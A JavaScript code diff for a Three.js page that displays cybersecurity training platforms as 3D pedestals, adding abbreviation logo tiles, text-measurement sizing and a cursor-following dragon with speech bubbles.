-const GRID_POS = [[-2.5*SX,0,-SZ],[-1.5*SX,0,-SZ],[-0.5*SX,0,-SZ],[0.5*SX,0,-SZ],[1.5*SX,0,-SZ],[2.5*SX,0,-SZ],[2.5*SX,0,0],[1.5*SX,0,0],[0.5*SX,0,0],[-0.5*SX,0,0],[-1.5*SX,0,0],[-2.5*SX,0,0],[-2.5*SX,0,SZ],[-1.5*SX,0,SZ],[-0.5*SX,0,SZ],[0.5*SX,0,SZ],[1.5*SX,0,SZ],[2.5*SX,0,SZ]];
+const GRID_POS = [
+  [-2.5*SX,0,-SZ],[-1.5*SX,0,-SZ],[-0.5*SX,0,-SZ],[0.5*SX,0,-SZ],[1.5*SX,0,-SZ],[2.5*SX,0,-SZ],
+  [2.5*SX,0,0],[1.5*SX,0,0],[0.5*SX,0,0],[-0.5*SX,0,0],[-1.5*SX,0,0],[-2.5*SX,0,0],
+  [-2.5*SX,0,SZ],[-1.5*SX,0,SZ],[-0.5*SX,0,SZ],[0.5*SX,0,SZ],[1.5*SX,0,SZ],[2.5*SX,0,SZ]
+];
 
 let W = window.innerWidth, H = window.innerHeight, aspect = W/H, BASE_F = 34;
 const renderer = new THREE.WebGLRenderer({antialias:true, alpha:true});
@@ -124,73 +391,1010 @@ renderer.shadowMap.enabled = true; renderer.shadowMap.type = THREE.PCFSoftShadow
 document.body.appendChild(renderer.domElement);
 const scene = new THREE.Scene();
 scene.background = new THREE.Color(0x050510);
-scene.fog = new THREE.FogExp2(0x050510, 0.012);
-const camera = new THREE.OrthographicCamera(-BASE_F*aspect/2, BASE_F*aspect/2, BASE_F/2, -BASE_F/2, -200, 200);
+scene.fog = new THREE.FogExp2(0x050510, 0.011);
+const camera = new THREE.OrthographicCamera(-BASE_F*aspect/2,BASE_F*aspect/2,BASE_F/2,-BASE_F/2,-200,200);
 
-// LIGHTS - CORREGIDO
 scene.add(new THREE.AmbientLight(0x0d0d25, 1.2));
 const sun = new THREE.DirectionalLight(0xffffff, 0.7);
-sun.position.set(15,25,15); sun.castShadow = true; sun.shadow.mapSize.set(1024,1024); scene.add(sun);
-const glow0 = new THREE.PointLight(0x00ff88, 2.5, 28); glow0.position.set(-10,4,-8); scene.add(glow0);
-const glow1 = new THREE.PointLight(0xff9500, 2, 28); glow1.position.set(10,4,0); scene.add(glow1);
-const glow2 = new THREE.PointLight(0xff5555, 2, 28); glow2.position.set(-10,4,8); scene.add(glow2);
+sun.position.set(15,25,15); sun.castShadow=true; sun.shadow.mapSize.set(1024,1024); scene.add(sun);
+const glow0=new THREE.PointLight(0x00ff88,2.5,28); glow0.position.set(-10,4,-8); scene.add(glow0);
+const glow1=new THREE.PointLight(0xff9500,2,28);   glow1.position.set(10,4,0);   scene.add(glow1);
+const glow2=new THREE.PointLight(0xff5555,2,28);   glow2.position.set(-10,4,8);  scene.add(glow2);
 
-const gridH = new THREE.GridHelper(70,35,0x0d0d25,0x080818); gridH.position.y = -0.55; scene.add(gridH);
+const gridH=new THREE.GridHelper(70,35,0x0d0d25,0x080818); gridH.position.y=-0.55; scene.add(gridH);
 
-function makeLogoTexture(p){const S=128,cv=document.createElement('canvas');cv.width=cv.height=S;const cx=cv.getContext('2d');cx.fillStyle='#07071a';cx.fillRect(0,0,S,S);cx.strokeStyle=LEVEL_COLORS[p.level];cx.lineWidth=5;cx.strokeRect(5,5,S-10,S-10);cx.font=`bold 54px 'Space Grotesk',sans-serif`;cx.textAlign='center';cx.textBaseline='middle';cx.fillStyle=LEVEL_COLORS[p.level];cx.fillText(p.name.charAt(0),S/2,S/2);const tex=new THREE.CanvasTexture(cv);const img=new Image();img.crossOrigin='anonymous';img.onload=()=>{cx.clearRect(0,0,S,S);cx.fillStyle='#07071a';cx.fillRect(0,0,S,S);cx.strokeStyle=LEVEL_COLORS[p.level];cx.lineWidth=5;cx.strokeRect(5,5,S-10,S-10);const pad=22;cx.drawImage(img,pad,pad,S-pad*2,S-pad*2);tex.needsUpdate=true};img.src=`https://www.google.com/s2/favicons?domain=${p.domain}&sz=64`;return tex;}
-function makeNameSprite(text,color){const cv=document.createElement('canvas');cv.width=320;cv.height=48;const cx=cv.getContext('2d');cx.font=`bold 22px 'JetBrains Mono',monospace`;cx.textAlign='center';cx.textBaseline='middle';cx.fillStyle=color;cx.globalAlpha=0.9;cx.fillText(text,160,24);const tex=new THREE.CanvasTexture(cv);const mat=new THREE.SpriteMaterial({map:tex,transparent:true,depthWrite:false});const sp=new THREE.Sprite(mat);sp.scale.set(4.2,0.64,1);return sp;}
-function makeNumSprite(n,color){const cv=document.createElement('canvas');cv.width=cv.height=64;const cx=cv.getContext('2d');cx.beginPath();cx.arc(32,32,28,0,Math.PI*2);cx.fillStyle=color;cx.fill();cx.font=`bold 24px 'JetBrains Mono',monospace`;cx.textAlign='center';cx.textBaseline='middle';cx.fillStyle='#050510';cx.fillText(String(n),32,33);const tex=new THREE.CanvasTexture(cv);const mat=new THREE.SpriteMaterial({map:tex,transparent:true,depthWrite:false});const sp=new THREE.Sprite(mat);sp.scale.set(0.9,0.9,1);return sp;}
+/* =====================================================================
+   PLATAFORMAS (igual que original)
+   ===================================================================== */
+const PLATFORM_ABBR = {
+  'TryHackMe':        'THM',
+  'PicoCTF':          'piCo',
+  'OverTheWire':      'OTW',
+  'OWASP Juice Shop': 'OWS',
+  'Hacker101':        'H101',
+  'CryptoHack':       'CRYP',
+  'Hack The Box':     'HTB',
+  'PortSwigger':      'PSW',
+  'Root Me':          'R-ME',
+  'PentesterLab':     'PLB',
+  'CTFChallenge':     'CTC',
+  'YesWeHack DOJO':   'YWH',
+  'VulnHub':          'VHB',
+  'crAPI (OWASP)':    'API',
+  'Metasploitable 3': 'MS3',
+  'APIsec University':'APIsec',
+  'Google CTF':       'GCTF',
+  'Hacking Hub':      'HUB',
+};
 
-const allPlatformGroups = [], hitObjects = [];
-let time = 0;
+function makeLogoTexture(p) {
+  const S = 128, col = LEVEL_COLORS[p.level];
+  const cv = document.createElement('canvas'); cv.width = cv.height = S;
+  const cx = cv.getContext('2d');
+  cx.fillStyle = '#07071a'; cx.fillRect(0, 0, S, S);
+  const pad = 7, r = 18;
+  cx.beginPath();
+  cx.moveTo(pad+r,pad); cx.lineTo(S-pad-r,pad); cx.arcTo(S-pad,pad,S-pad,pad+r,r);
+  cx.lineTo(S-pad,S-pad-r); cx.arcTo(S-pad,S-pad,S-pad-r,S-pad,r);
+  cx.lineTo(pad+r,S-pad); cx.arcTo(pad,S-pad,pad,S-pad-r,r);
+  cx.lineTo(pad,pad+r); cx.arcTo(pad,pad,pad+r,pad,r);
+  cx.closePath();
+  cx.fillStyle = col+'18'; cx.fill();
+  cx.strokeStyle = col; cx.lineWidth = 3.5;
+  cx.shadowBlur = 14; cx.shadowColor = col; cx.stroke(); cx.shadowBlur = 0;
+  [[pad+5,pad+5],[S-pad-5,pad+5],[S-pad-5,S-pad-5],[pad+5,S-pad-5]].forEach(([dx,dy])=>{
+    cx.beginPath(); cx.arc(dx,dy,2.8,0,Math.PI*2); cx.fillStyle=col+'99'; cx.fill();
+  });
+  const abbr = PLATFORM_ABBR[p.name] || p.name.slice(0,3).toUpperCase();
+  const fs = abbr.length <= 3 ? 40 : abbr.length <= 4 ? 30 : 22;
+  cx.font = `bold ${fs}px 'JetBrains Mono',monospace`;
+  cx.textAlign = 'center'; cx.textBaseline = 'middle';
+  cx.shadowBlur = 18; cx.shadowColor = col;
+  cx.fillStyle = col; cx.fillText(abbr, S/2, S/2 - 4);
+  cx.shadowBlur = 0;
+  cx.strokeStyle = col+'55'; cx.lineWidth = 1;
+  cx.beginPath(); cx.moveTo(pad+16,S/2+fs/2+4); cx.lineTo(S-pad-16,S/2+fs/2+4); cx.stroke();
+  return new THREE.CanvasTexture(cv);
+}
+function makeNameSprite(text,color){
+  // PRETEXT: medimos el texto antes de crear el canvas — sin canvas desperdiciado
+  const font = `bold 22px 'JetBrains Mono',monospace`;
+  const prep = ptPrepare(text, font);
+  const tw = ptNaturalWidth(prep);
+  const W = Math.ceil(tw) + 20, H = 48;
+  const cv=document.createElement('canvas'); cv.width=W; cv.height=H;
+  const cx=cv.getContext('2d');cx.font=font;cx.textAlign='center';cx.textBaseline='middle';
+  cx.fillStyle=color;cx.globalAlpha=0.9;cx.fillText(text,W/2,H/2);
+  const tex=new THREE.CanvasTexture(cv);
+  const mat=new THREE.SpriteMaterial({map:tex,transparent:true,depthWrite:false});
+  const sp=new THREE.Sprite(mat);
+  // PRETEXT: scale basado en ancho medido — ratio exacto
+  sp.scale.set(W/76, H/76, 1);
+  return sp;
+}
+function makeNumSprite(n,color){
+  // PRETEXT: measureNaturalWidth para badge numérico exacto
+  const font=`bold 24px 'JetBrains Mono',monospace`;
+  const prep=ptPrepare(String(n), font);
+  const tw=ptNaturalWidth(prep);
+  const S=Math.ceil(tw)+20;
+  const cv=document.createElement('canvas');cv.width=S;cv.height=S;
+  const cx=cv.getContext('2d');cx.beginPath();cx.arc(S/2,S/2,S/2-2,0,Math.PI*2);
+  cx.fillStyle=color;cx.fill();cx.font=font;cx.textAlign='center';cx.textBaseline='middle';
+  cx.fillStyle='#050510';cx.fillText(String(n),S/2,S/2+1);
+  const tex=new THREE.CanvasTexture(cv);
+  const mat=new THREE.SpriteMaterial({map:tex,transparent:true,depthWrite:false});
+  const sp=new THREE.Sprite(mat);sp.scale.set(S/72,S/72,1);return sp;
+}
 
-PLATFORMS.forEach((p,i)=>{const [px,py,pz]=GRID_POS[i];const col=new THREE.Color(LEVEL_COLORS[p.level]);const colDark=col.clone().multiplyScalar(0.18);const colGlow=col.clone().multiplyScalar(0.08);const group=new THREE.Group();group.position.set(px,py,pz);group.userData={platform:p,idx:i,phase:Math.random()*Math.PI*2};const pedestalG=new THREE.CylinderGeometry(1.55,1.75,0.45,6,1);const pedestalM=new THREE.MeshLambertMaterial({color:colDark,emissive:colGlow});const pedestal=new THREE.Mesh(pedestalG,pedestalM);pedestal.position.y=-0.22;pedestal.castShadow=true;group.add(pedestal);const blockG=new THREE.BoxGeometry(2.75,0.85,2.75);const blockM=new THREE.MeshLambertMaterial({color:new THREE.Color(0x0c0c20),emissive:colGlow});const block=new THREE.Mesh(blockG,blockM);block.position.y=0.42;block.castShadow=true;block.receiveShadow=true;group.add(block);const logoG=new THREE.PlaneGeometry(2.1,2.1);const logoM=new THREE.MeshBasicMaterial({map:makeLogoTexture(p),transparent:true});const logoFace=new THREE.Mesh(logoG,logoM);logoFace.rotation.x=-Math.PI/2;logoFace.position.y=0.86;group.add(logoFace);const ringG=new THREE.RingGeometry(1.15,1.42,6);const ringM=new THREE.MeshBasicMaterial({color:LEVEL_COLORS[p.level],transparent:true,opacity:0.45,side:THREE.DoubleSide});const ring=new THREE.Mesh(ringG,ringM);ring.rotation.x=-Math.PI/2;ring.position.y=0.87;group.add(ring);group.userData.ring=ring;for(let c=0;c<4;c++){const angle=(c/4)*Math.PI*2+Math.PI/4;const lineG=new THREE.BoxGeometry(0.04,0.88,0.04);const lineM=new THREE.MeshBasicMaterial({color:LEVEL_COLORS[p.level],transparent:true,opacity:0.3});const line=new THREE.Mesh(lineG,lineM);line.position.set(Math.cos(angle)*1.36,0.42,Math.sin(angle)*1.36);group.add(line);}const nameSp=makeNameSprite(p.name,LEVEL_COLORS[p.level]);nameSp.position.set(0,-1.0,0);group.add(nameSp);const numSp=makeNumSprite(i+1,LEVEL_COLORS[p.level]);numSp.position.set(1.55,1.55,0);group.add(numSp);const hitG=new THREE.BoxGeometry(3,2,3);const hitM=new THREE.MeshBasicMaterial({visible:false});const hitMesh=new THREE.Mesh(hitG,hitM);hitMesh.userData={isPlatform:true,platform:p,idx:i};group.add(hitMesh);hitObjects.push(hitMesh);allPlatformGroups.push(group);scene.add(group);});
+const allPlatformGroups=[],hitObjects=[],platformWorldPos=[];
+let time=0;
 
-function buildPath(){const pts=[];GRID_POS.forEach(([x,,z],i)=>{pts.push(new THREE.Vector3(x,0.12,z));if(i===5){pts.push(new THREE.Vector3(x+2.0,0.12,z));pts.push(new THREE.Vector3(x+2.0,0.12,(z+GRID_POS[6][2])/2));pts.push(new THREE.Vector3(GRID_POS[6][0]+2.0,0.12,GRID_POS[6][2]));}if(i===11){pts.push(new THREE.Vector3(x-2.0,0.12,z));pts.push(new THREE.Vector3(x-2.0,0.12,(z+GRID_POS[12][2])/2));pts.push(new THREE.Vector3(GRID_POS[12][0]-2.0,0.12,GRID_POS[12][2]));}});const curve=new THREE.CatmullRomCurve3(pts,false,'catmullrom',0.5);const tubeG=new THREE.TubeGeometry(curve,260,0.055,8,false);const tubeM=new THREE.MeshBasicMaterial({color:0x00ff88,transparent:true,opacity:0.45});scene.add(new THREE.Mesh(tubeG,tubeM));return curve;}
+PLATFORMS.forEach((p,i)=>{
+  const[px,py,pz]=GRID_POS[i];
+  platformWorldPos.push(new THREE.Vector3(px,py,pz));
+  const col=new THREE.Color(LEVEL_COLORS[p.level]);
+  const colDark=col.clone().multiplyScalar(0.18);
+  const colGlow=col.clone().multiplyScalar(0.08);
+  const group=new THREE.Group();group.position.set(px,py,pz);group.userData={platform:p,idx:i,phase:Math.random()*Math.PI*2};
+  const pedestalG=new THREE.CylinderGeometry(1.55,1.75,0.45,6,1);
+  const pedestalM=new THREE.MeshLambertMaterial({color:colDark,emissive:colGlow});
+  const pedestal=new THREE.Mesh(pedestalG,pedestalM);pedestal.position.y=-0.22;pedestal.castShadow=true;group.add(pedestal);
+  const blockG=new THREE.BoxGeometry(2.75,0.85,2.75);
+  const blockM=new THREE.MeshLambertMaterial({color:new THREE.Color(0x0c0c20),emissive:colGlow});
+  const block=new THREE.Mesh(blockG,blockM);block.position.y=0.42;block.castShadow=true;block.receiveShadow=true;group.add(block);
+  const logoG=new THREE.PlaneGeometry(2.1,2.1);
+  const logoM=new THREE.MeshBasicMaterial({map:makeLogoTexture(p),transparent:true});
+  const logoFace=new THREE.Mesh(logoG,logoM);logoFace.rotation.x=-Math.PI/2;logoFace.position.y=0.86;group.add(logoFace);
+  const ringG=new THREE.RingGeometry(1.15,1.42,6);
+  const ringM=new THREE.MeshBasicMaterial({color:LEVEL_COLORS[p.level],transparent:true,opacity:0.45,side:THREE.DoubleSide});
+  const ring=new THREE.Mesh(ringG,ringM);ring.rotation.x=-Math.PI/2;ring.position.y=0.87;group.add(ring);group.userData.ring=ring;
+  for(let c=0;c<4;c++){const angle=(c/4)*Math.PI*2+Math.PI/4;const lineG=new THREE.BoxGeometry(0.04,0.88,0.04);const lineM=new THREE.MeshBasicMaterial({color:LEVEL_COLORS[p.level],transparent:true,opacity:0.3});const line=new THREE.Mesh(lineG,lineM);line.position.set(Math.cos(angle)*1.36,0.42,Math.sin(angle)*1.36);group.add(line);}
+  const nameSp=makeNameSprite(p.name,LEVEL_COLORS[p.level]);nameSp.position.set(0,-1.0,0);group.add(nameSp);
+  const numSp=makeNumSprite(i+1,LEVEL_COLORS[p.level]);numSp.position.set(1.55,1.55,0);group.add(numSp);
+  const hitG=new THREE.BoxGeometry(3,2,3);
+  const hitM=new THREE.MeshBasicMaterial({visible:false});
+  const hitMesh=new THREE.Mesh(hitG,hitM);hitMesh.userData={isPlatform:true,platform:p,idx:i};group.add(hitMesh);hitObjects.push(hitMesh);
+  allPlatformGroups.push(group);scene.add(group);
+});
+
+function buildPath(){
+  const pts=[];
+  GRID_POS.forEach(([x,,z],i)=>{
+    pts.push(new THREE.Vector3(x,0.12,z));
+    if(i===5){pts.push(new THREE.Vector3(x+2.0,0.12,z));pts.push(new THREE.Vector3(x+2.0,0.12,(z+GRID_POS[6][2])/2));pts.push(new THREE.Vector3(GRID_POS[6][0]+2.0,0.12,GRID_POS[6][2]));}
+    if(i===11){pts.push(new THREE.Vector3(x-2.0,0.12,z));pts.push(new THREE.Vector3(x-2.0,0.12,(z+GRID_POS[12][2])/2));pts.push(new THREE.Vector3(GRID_POS[12][0]-2.0,0.12,GRID_POS[12][2]));}
+  });
+  const curve=new THREE.CatmullRomCurve3(pts,false,'catmullrom',0.5);
+  const tubeG=new THREE.TubeGeometry(curve,260,0.055,8,false);
+  const tubeM=new THREE.MeshBasicMaterial({color:0x00ff88,transparent:true,opacity:0.3});
+  scene.add(new THREE.Mesh(tubeG,tubeM));
+  return curve;
+}
 const pathCurve=buildPath();
 
-const PCOUNT=50;const pPositions=new Float32Array(PCOUNT*3);const pGeo=new THREE.BufferGeometry();pGeo.setAttribute('position',new THREE.BufferAttribute(pPositions,3));const pMat=new THREE.PointsMaterial({color:0x00ff88,size:0.22,transparent:true,opacity:0.85,sizeAttenuation:true});const pSystem=new THREE.Points(pGeo,pMat);scene.add(pSystem);const pOffsets=Array.from({length:PCOUNT},(_,i)=>i/PCOUNT);
+const PCOUNT=50;
+const pPositions=new Float32Array(PCOUNT*3);
+const pGeo=new THREE.BufferGeometry();pGeo.setAttribute('position',new THREE.BufferAttribute(pPositions,3));
+const pMat=new THREE.PointsMaterial({color:0x00ff88,size:0.22,transparent:true,opacity:0.7,sizeAttenuation:true});
+const pSystem=new THREE.Points(pGeo,pMat);scene.add(pSystem);
+const pOffsets=Array.from({length:PCOUNT},(_,i)=>i/PCOUNT);
 
 (function(){const COUNT=1200;const starPos=new Float32Array(COUNT*3);for(let i=0;i<COUNT;i++){starPos[i*3]=(Math.random()-0.5)*180;starPos[i*3+1]=Math.random()*40+5;starPos[i*3+2]=(Math.random()-0.5)*180;}const sGeo=new THREE.BufferGeometry();sGeo.setAttribute('position',new THREE.BufferAttribute(starPos,3));scene.add(new THREE.Points(sGeo,new THREE.PointsMaterial({color:0xaaaacc,size:0.12,transparent:true,opacity:0.5,sizeAttenuation:true})));})();
 
-let zoomF=1.0;const MIN_ZOOM=0.85,MAX_ZOOM=1.15;let autoRotate=false;const sph={theta:Math.PI*0.22,phi:0.82};const CAM_R=55;
-function applyCam(){const f=BASE_F/zoomF;camera.left=-f*aspect/2;camera.right=f*aspect/2;camera.top=f/2;camera.bottom=-f/2;camera.updateProjectionMatrix();camera.position.set(CAM_R*Math.sin(sph.phi)*Math.sin(sph.theta),CAM_R*Math.cos(sph.phi),CAM_R*Math.sin(sph.phi)*Math.cos(sph.theta));camera.lookAt(0,0,0);}
+/* =====================================================================
+   DRAGON SYSTEM — Kali Linux Dragon
+   ===================================================================== */
 
-let dragging=false,prevM={x:0,y:0};const isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+/* =====================================================================
+   SVG DRAGON SYSTEM — cadena de segmentos SVG que sigue al puntero
+   ===================================================================== */
+const svgNS   = 'http://www.w3.org/2000/svg';
+const xlinkNS = 'http://www.w3.org/1999/xlink';
+const dragonSVGEl  = document.getElementById('dragonSVG');
+const dragonScreen = document.getElementById('dragonScreen');
+
+const DN = 40;
+const dElems = [];
+for (let i = 0; i < DN; i++) dElems[i] = { use: null, x: W/2, y: H/4 };
+
+const dPointer = { x: W/2, y: H/2 };
+let dFrm = Math.random();
+let dRad = 0;
+const dRadM = 90;
+let dragonEnabled = true;
+let dragonNearIdx = -1;
+let speechTimer   = 0;
+let lastSpeechIdx = -1;
+
+// makeBodySegDataURL — igual que makeBodySegTex del original pero devuelve data URL para SVG <image>
+function makeBodySegDataURL(glyph, segIdx) {
+  const fontSize = Math.max(6, 10 - segIdx * 0.12);
+  const pad = 3;
+  const cv = document.createElement('canvas');
+  const ctx = cv.getContext('2d');
+  ctx.font = `bold ${fontSize}px 'JetBrains Mono', monospace`;
+  const tw = ctx.measureText(glyph).width;
+  cv.width  = Math.ceil(tw + pad * 2);
+  cv.height = Math.ceil(fontSize * 1.5 + pad);
+  const r = 3;
+  const w = cv.width, h = cv.height;
+  ctx.fillStyle = 'rgba(0,10,5,0.75)';
+  ctx.beginPath();
+  ctx.moveTo(r,0); ctx.lineTo(w-r,0); ctx.arcTo(w,0,w,r,r);
+  ctx.lineTo(w,h-r); ctx.arcTo(w,h,w-r,h,r);
+  ctx.lineTo(r,h); ctx.arcTo(0,h,0,h-r,r);
+  ctx.lineTo(0,r); ctx.arcTo(0,0,r,0,r);
+  ctx.closePath(); ctx.fill();
+  ctx.strokeStyle = `rgba(0,255,136,${Math.max(0.06, 0.28 - segIdx*0.006)})`;
+  ctx.lineWidth = 0.6;
+  ctx.stroke();
+  ctx.font = `bold ${fontSize}px 'JetBrains Mono', monospace`;
+  ctx.textBaseline = 'middle';
+  ctx.textAlign = 'center';
+  const alpha = Math.max(0.2, 0.95 - segIdx * 0.02);
+  ctx.shadowBlur = 4; ctx.shadowColor = '#00ff88';
+  ctx.fillStyle = `rgba(0,255,136,${alpha})`;
+  ctx.fillText(glyph, w/2, h/2);
+  return { url: cv.toDataURL(), w, h };
+}
+
+// Crear los segmentos del dragon: cabeza y alas como <use>, cuerpo como <image> canvas
+for (let i = 1; i < DN; i++) {
+  let el;
+  if (i === 1) {
+    el = document.createElementNS(svgNS, 'use');
+    el.setAttributeNS(xlinkNS, 'xlink:href', '#DCabeza');
+  } else if (i === 8) {
+    el = document.createElementNS(svgNS, 'use');
+    el.setAttributeNS(xlinkNS, 'xlink:href', '#DAletas');
+  } else {
+    const glyph = HACKING_GLYPHS[(i * 7) % HACKING_GLYPHS.length];
+    const { url, w, h } = makeBodySegDataURL(glyph, i);
+    el = document.createElementNS(svgNS, 'image');
+    el.setAttributeNS(xlinkNS, 'xlink:href', url);
+    el.setAttribute('width',  w);
+    el.setAttribute('height', h);
+    el.setAttribute('x', -w / 2);
+    el.setAttribute('y', -h / 2);
+  }
+  dElems[i].use = el;
+  dElems[i].noRotate = (i !== 1 && i !== 8);
+  dragonScreen.appendChild(el);
+}
+
+// Desktop: el dragón sigue el cursor
+window.addEventListener('mousemove', e => {
+  dPointer.x = e.clientX;
+  dPointer.y = e.clientY;
+  dRad = 0;
+});
+// Mobile: sigue el toque
+window.addEventListener('touchmove', e => {
+  dPointer.x = e.touches[0].clientX;
+  dPointer.y = e.touches[0].clientY;
+  dRad = 0;
+}, { passive: true });
+
+function updateSVGDragon(dt) {
+  if (!dragonEnabled) return;
+
+  // Mover el punto líder
+  const e0 = dElems[0];
+  const ax = (Math.cos(3 * dFrm) * dRad * W) / H;
+  const ay = (Math.sin(4 * dFrm) * dRad * H) / W;
+  e0.x += (ax + dPointer.x - e0.x) / 10;
+  e0.y += (ay + dPointer.y - e0.y) / 10;
+
+  for (let i = 1; i < DN; i++) {
+    const e  = dElems[i];
+    const ep = dElems[i - 1];
+    const a  = Math.atan2(e.y - ep.y, e.x - ep.x);
+    e.x += (ep.x - e.x + (Math.cos(a) * (100 - i)) / 5) / 4;
+    e.y += (ep.y - e.y + (Math.sin(a) * (100 - i)) / 5) / 4;
+    const s = (162 + 4 * (1 - i)) / 180;
+    const tx = (ep.x + e.x) / 2, ty = (ep.y + e.y) / 2;
+    if (e.noRotate) {
+      e.use.setAttribute('transform', `translate(${tx},${ty}) scale(${s},${s})`);
+    } else {
+      e.use.setAttribute('transform', `translate(${tx},${ty}) rotate(${(180/Math.PI)*a}) scale(${s},${s})`);
+    }
+  }
+
+  if (dRad < dRadM) dRad++;
+  dFrm += 0.003;
+  // Si lleva tiempo moviéndose solo, atraer de vuelta al centro
+  if (dRad > 60) {
+    dPointer.x += (W/2 - dPointer.x) * 0.04;
+    dPointer.y += (H/2 - dPointer.y) * 0.04;
+  }
+
+  // ── Detección de proximidad con plataformas (por pantalla) ──
+  const headX = dElems[1].x, headY = dElems[1].y;
+  let closest = -1, closestDist = Infinity;
+  platformWorldPos.forEach((pos, idx) => {
+    const sc = worldToScreen(pos.clone().setY(pos.y + 2));
+    const dist = Math.hypot(sc.x - headX, sc.y - headY);
+    if (dist < 90 && dist < closestDist) { closestDist = dist; closest = idx; }
+  });
+
+  if (closest !== -1) {
+    dragonNearIdx = closest;
+    if (speechTimer <= 0) {
+      const pf = PLATFORMS[closest];
+      showSpeech({...pf, idx: closest}, headX, headY);
+    }
+    speechTimer = 3.5;
+  } else {
+    dragonNearIdx = -1;
+    if (speechTimer > 0) { speechTimer -= dt; if (speechTimer <= 0) hideSpeech(); }
+  }
+}
+
+/* =====================================================================
+   SPEECH BUBBLE — Pretext mide la descripción antes de posicionar
+   ===================================================================== */
+const speechBubble = document.getElementById('speechBubble');
+const sbName    = document.getElementById('sbName');
+const sbBadge   = document.getElementById('sbBadge');
+const sbCmd     = document.getElementById('sbCmd');
+const sbDesc    = document.getElementById('sbDesc');
+const diStatus  = document.getElementById('diStatus');
+
+function showSpeech(platform, screenX, screenY) {
+  if (lastSpeechIdx === platform.idx) return;
+  lastSpeechIdx = platform.idx;
+
+  sbName.textContent = platform.name;
+  sbBadge.textContent = LEVEL_NAMES[platform.level];
+  sbBadge.style.background = LEVEL_COLORS[platform.level] + '22';
+  sbBadge.style.color = LEVEL_COLORS[platform.level];
+  sbCmd.textContent = DRAGON_MSGS[Math.floor(Math.random()*DRAGON_MSGS.length)];
+
+  // PRETEXT: layout del texto antes de posicionar — sin adivinanzas de altura
+  const maxBubbleW = 230;
+  const descFont = '11px JetBrains Mono';
+  const prep = ptPrepare(platform.desc, descFont);
+  const { lineCount } = ptLayout(prep, maxBubbleW - 32, 15);
+
+  // PRETEXT: layoutWithLines para renderizar correctamente en el bubble
+  const { lines } = ptLayoutWithLines(prep, maxBubbleW - 32, 15);
+  sbDesc.textContent = lines.slice(0, 3).map(l=>l.text).join(' ');
+
+  const bubbleH = 100 + lineCount * 15;
+  const sx = Math.min(W-260, Math.max(10, screenX-20));
+  const sy = Math.min(H-bubbleH-20, Math.max(10, screenY-bubbleH-20));
+  speechBubble.style.left = sx+'px';
+  speechBubble.style.top  = sy+'px';
+  speechBubble.classList.add('visible');
+
+  diStatus.textContent = `Hackeando: ${platform.name}`;
+  speechTimer = 4;
+}
+
+function hideSpeech() {
+  speechBubble.classList.remove('visible');
+  lastSpeechIdx = -1;
+}
+
+function worldToScreen(v3) {
+  const v = v3.clone().project(camera);
+  return { x:(v.x+1)/2*W, y:(-v.y+1)/2*H };
+}
+
+/* =====================================================================
+   CÁMARA Y CONTROLES
+   ===================================================================== */
+let zoomF=1.0; const MIN_Z=0.85,MAX_Z=1.15;
+let autoRotate=false;
+const sph={theta:Math.PI*0.22,phi:0.82};
+const CAM_R=55;
+
+function applyCam(){
+  const f=BASE_F/zoomF;
+  camera.left=-f*aspect/2;camera.right=f*aspect/2;camera.top=f/2;camera.bottom=-f/2;
+  camera.updateProjectionMatrix();
+  camera.position.set(CAM_R*Math.sin(sph.phi)*Math.sin(sph.theta),CAM_R*Math.cos(sph.phi),CAM_R*Math.sin(sph.phi)*Math.cos(sph.theta));
+  camera.lookAt(0,0,0);
+}
+
+let dragging=false,prevM={x:0,y:0};
+const isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 renderer.domElement.addEventListener('mousedown',e=>{if(isMobile)return;dragging=true;prevM={x:e.clientX,y:e.clientY};renderer.domElement.style.cursor='grabbing';});
 window.addEventListener('mouseup',()=>{dragging=false;renderer.domElement.style.cursor='';});
 window.addEventListener('mousemove',e=>{if(dragging&&!isMobile){sph.theta-=(e.clientX-prevM.x)*0.007;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.clientY-prevM.y)*0.007));prevM={x:e.clientX,y:e.clientY};applyCam();}handleHover(e.clientX,e.clientY);});
-renderer.domElement.addEventListener('wheel',e=>{if(isMobile){e.preventDefault();return;}zoomF=Math.max(MIN_ZOOM,Math.min(MAX_ZOOM,zoomF-e.deltaY*0.0015));applyCam();},{passive:false});
-let prevT=null;renderer.domElement.addEventListener('touchstart',e=>{if(e.touches.length===1){prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};handleHover(e.touches[0].clientX,e.touches[0].clientY);}},{passive:true});
-renderer.domElement.addEventListener('touchmove',e=>{if(!prevT||e.touches.length!==1)return;sph.theta-=(e.touches[0].clientX-prevT.x)*0.008;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.touches[0].clientY-prevT.y)*0.008));prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};applyCam();handleHover(e.touches[0].clientX,e.touches[0].clientY);e.preventDefault();},{passive:false});
+renderer.domElement.addEventListener('wheel',e=>{if(isMobile){e.preventDefault();return;}zoomF=Math.max(MIN_Z,Math.min(MAX_Z,zoomF-e.deltaY*0.0015));applyCam();},{passive:false});
+let prevT=null, touchStartPos=null, touchMoved=false;
+renderer.domElement.addEventListener('touchstart',e=>{if(e.touches.length===1){prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};touchStartPos={x:e.touches[0].clientX,y:e.touches[0].clientY};touchMoved=false;handleHover(e.touches[0].clientX,e.touches[0].clientY);}},{passive:true});
+renderer.domElement.addEventListener('touchmove',e=>{if(!prevT||e.touches.length!==1)return;const dx=e.touches[0].clientX-touchStartPos.x,dy=e.touches[0].clientY-touchStartPos.y;if(Math.sqrt(dx*dx+dy*dy)>8)touchMoved=true;sph.theta-=(e.touches[0].clientX-prevT.x)*0.008;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.touches[0].clientY-prevT.y)*0.008));prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};applyCam();handleHover(e.touches[0].clientX,e.touches[0].clientY);e.preventDefault();},{passive:false});
+renderer.domElement.addEventListener('touchend',e=>{if(!touchMoved&&hovered&&e.changedTouches.length===1){showPlatformPreview(hovered);}touchStartPos=null;},{passive:true});
 
 document.getElementById('btnReset').addEventListener('click',()=>{sph.theta=Math.PI*0.22;sph.phi=0.82;zoomF=1.0;applyCam();});
 const autoBtn=document.getElementById('btnAuto');
